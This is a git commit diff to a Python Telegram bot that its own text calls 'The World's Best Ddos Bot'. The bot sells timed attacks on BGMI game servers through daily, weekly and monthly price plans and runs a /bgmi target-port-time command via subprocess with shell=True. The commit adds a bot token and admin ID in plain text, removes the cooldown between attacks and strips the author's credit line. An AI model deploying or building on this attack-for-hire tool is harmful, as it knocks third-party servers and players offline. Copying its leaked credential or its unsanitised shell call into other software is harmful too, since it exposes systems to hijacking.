c93d0ea9a77d84fb4ef25f77e59e5b5fafa5bfa6
Dark-Demon-Stack <vinzitrems@gmail.com>
2024-09-03 15:11:30 +0530

    Add files via upload

--- m.py
+++ m.py
@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#By Dark Demon BGMI @Dark_DEMON_001
+#@Dark_DEMON_001
 
 import telebot
 import subprocess
@@ -8,10 +8,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot(' Token      ')
+bot = telebot.TeleBot('7168164989:AAESU781yNbsmSafmDN9DZwJCNejbB01w0U')
 
 # Admin user IDs
-admin_id = [" chat Id "]
+admin_id = ["1269003116"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy Dark Demon BGMI @Dark_DEMON_001"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy @Dark_DEMON_001"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -224,7 +224,7 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                 response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
@@ -246,9 +246,9 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy Dark Demon BGMI @Dark_DEMON_001"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\nBy @Dark_DEMON_001"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy Dark Demon BGMI @Dark_DEMON_001"
+        response = "You Are Not Authorized To Use This Command by @Dark_DEMON_001"
 
     bot.reply_to(message, response)
 
@@ -285,7 +285,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By Dark Demon BGMI @Dark_DEMON_001
+ By @Dark_DEMON_001
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -300,7 +300,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy Dark Demon BGMI @Dark_DEMON_001"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @Dark_DEMON_001"
     bot.reply_to(message, response)
 
 
@@ -312,7 +312,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By Dark Demon BGMI @Dark_DEMON_001'''
+By @Dark_DEMON_001'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -329,7 +329,7 @@ Pr-ice List:
 Day-->150 Rs
 Week-->900 Rs
 Month-->1600 Rs
-By Dark Demon BGMI @Dark_DEMON_001
+By @Dark_DEMON_001
 '''
     bot.reply_to(message, response)
 
@@ -344,7 +344,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By Dark Demon BGMI @Dark_DEMON_001
+By @Dark_DEMON_001
 '''
     bot.reply_to(message, response)
 
@@ -375,4 +375,4 @@ def broadcast_message(message):
 
 
 bot.polling()
-#By Dark Demon BGMI @Dark_DEMON_001
+#By @Dark_DEMON_001
